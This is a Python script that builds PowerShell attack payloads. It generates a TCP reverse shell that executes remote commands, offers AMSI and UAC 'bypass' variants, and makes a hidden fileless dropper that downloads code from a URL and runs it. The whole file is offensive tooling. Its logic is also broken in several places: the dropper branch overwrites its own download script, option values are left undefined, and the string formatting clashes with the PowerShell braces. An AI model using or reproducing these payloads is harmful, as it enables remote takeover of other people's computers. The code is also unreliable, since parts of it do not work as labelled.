import os
import base64
import subprocess
import time
import sys

# Colors for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    OKRED = '\033[91m'
    OKYELLOW = '\033[93m'
    ENDC = '\033[0m'

# AMSI Bypass Methods
def amsi_bypass_options():
    print("\nAvailable AMSI Bypass Methods:")
    print("1. Bypass with [string]::Concat")
    print("2. Bypass with `i`e`x")
    print("3. Bypass with EncodedCommand")
    print("4. Bypass with Function Override")
    print("5. Bypass with Reflection")
    amsi_method = input("Select AMSI Bypass Method (1-5): ")
    return amsi_method

# UAC Bypass Methods
def uac_bypass_options():
    print("\nAvailable UAC Bypass Methods:")
    print("1. Use Registry Key")
    print("2. Use COM Object")
    print("3. Use Scheduled Task")
    print("4. Use Windows Installer")
    uac_method = input("Select UAC Bypass Method (1-4): ")
    return uac_method

# Reverse Shell Builder
def create_reverse_shell_script(ip, port, amsi_method, uac_method):
    script = f"""
    $client = New-Object System.Net.Sockets.TCPClient('{ip}', {port});
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535 | % {{}};
    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
        $sendback = (iex $data 2>&1 | Out-String);
        $sendback2 = $sendback + '<--deex-shell--> ' + (pwd).Path + ' ' + '#~ ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte, 0, $sendbyte.Length);
        $stream.Flush();
    }};
    $client.Close();
    """

    # AMSI Bypass Logic
    if amsi_method == "1":
        script = script.replace("iex", "[string]::Concat('iex')")
    elif amsi_method == "2":
        script = script.replace("iex", "i`e`x")
    elif amsi_method == "3":
        script = script.replace("iex", "Invoke-Expression -EncodedCommand")
    elif amsi_method == "4":
        script = script.replace("iex", "function iex { param($code) Invoke-Expression $code } iex")
    elif amsi_method == "5":
        script = script.replace("iex", "[Reflection.Assembly]::LoadWithPartialName('System.Core');[System.Management.Automation.PSMethod]::new([ScriptBlock]::Create('iex'))")

    # UAC Bypass Logic
    if uac_method == "1":
        uac_bypass_code = "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"{0}\"' -Verb RunAs"
    elif uac_method == "2":
        uac_bypass_code = "New-Object -ComObject Shell.Application | ForEach-Object { $_.ShellExecute('powershell', '-NoProfile -ExecutionPolicy Bypass -Command \"{0}\"', '', 'runas') }"
    elif uac_method == "3":
        uac_bypass_code = "Start-ScheduledTask -TaskName 'TaskName' -Run 'powershell -NoProfile -ExecutionPolicy Bypass -Command \"{0}\"'"
    elif uac_method == "4":
        uac_bypass_code = "Start-Process msiexec -ArgumentList '/i', 'path_to_msi', '/qn', '/L*v log.txt'"

    script = f"""
    {uac_bypass_code}
    {script}
    """.format(script)

    return script

# Build Fileless Dropper
def build_fileless_dropper(url, base64_encode, hidden, amsi_method, uac_method):
    # Encode URL if needed
    encoded_url = url
    if base64_encode.lower() == 'y':
        encoded_url = 'http://'+base64.b64encode(url.encode()).decode()
    
    # Create PowerShell script
    script = f"""
    $url = '{encoded_url}'
    $client = New-Object System.Net.WebClient
    $client.DownloadString($url) | Invoke-Expression
    """
    
    # Add AMSI and UAC Bypass
    script = create_reverse_shell_script('', '', amsi_method, uac_method)
    
    if hidden.lower() == 'y':
        script = script.replace("Invoke-Expression", "Invoke-Expression -WindowStyle Hidden")
    
    with open("fileless_dropper.ps1", "w") as f:
        f.write(script)
    
    print(f"Fileless Dropper script saved as fileless_dropper.ps1")

# Main Function
def main():
    print(f"\n|------ {Colors.OKYELLOW}Custom Dropper & Reverse Shell Builder{Colors.ENDC} ------|\n")
    time.sleep(1)
    
    choice = input("Select an option:\n1. Fileless Dropper\n2. Reverse Shell\n<--Your choice--> ")
    
    if choice == "1":
        url = input("Enter URL of the payload: ")
        base64_encode = input("Base64 URL Encode? (y/n): ")
        hidden = input("Run the script hidden? (y/n): ")
        amsi_method = 'N/A'  # Not applicable for dropper
        uac_method = 'N/A'  # Not applicable for dropper
        build_fileless_dropper(url, base64_encode, hidden, amsi_method, uac_method)
    
    elif choice == "2":
        ip = input("Enter IP address: ")
        port = input("Enter port: ")
        amsi_method = amsi_bypass_options()
        uac_method = uac_bypass_options()
        script = create_reverse_shell_script(ip, port, amsi_method, uac_method)
        
        filename = input("Enter filename for the reverse shell script (e.g., reverse_shell.ps1): ")
        with open(filename, "w") as f:
            f.write(script)
        print(f"Reverse Shell script saved as {filename}")
    
    else:
        print("Invalid choice. Exiting.")
        sys.exit()

if __name__ == "__main__":
    main()
